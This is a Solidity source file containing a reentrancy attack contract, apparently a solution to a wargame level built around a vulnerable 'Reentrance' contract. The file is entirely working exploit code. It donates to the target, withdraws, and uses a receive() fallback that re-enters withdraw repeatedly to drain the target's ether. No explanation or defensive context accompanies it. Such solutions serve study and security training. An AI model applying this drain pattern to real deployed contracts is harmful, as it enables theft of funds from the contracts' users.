// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "./Reentrance.sol";

contract ReentranceAttack {
    Reentrance public reentrance;
    uint256 balanceReentrance;

    constructor(Reentrance _reentrance) public payable {
        reentrance = _reentrance;
        balanceReentrance = address(_reentrance).balance;
    }

    function attack(address payable dest) external {
        reentrance.donate{value: balanceReentrance}(address(this));
        reentrance.withdraw(balanceReentrance);
    }

    receive() external payable {
        reentrance.withdraw(balanceReentrance);
    }
}
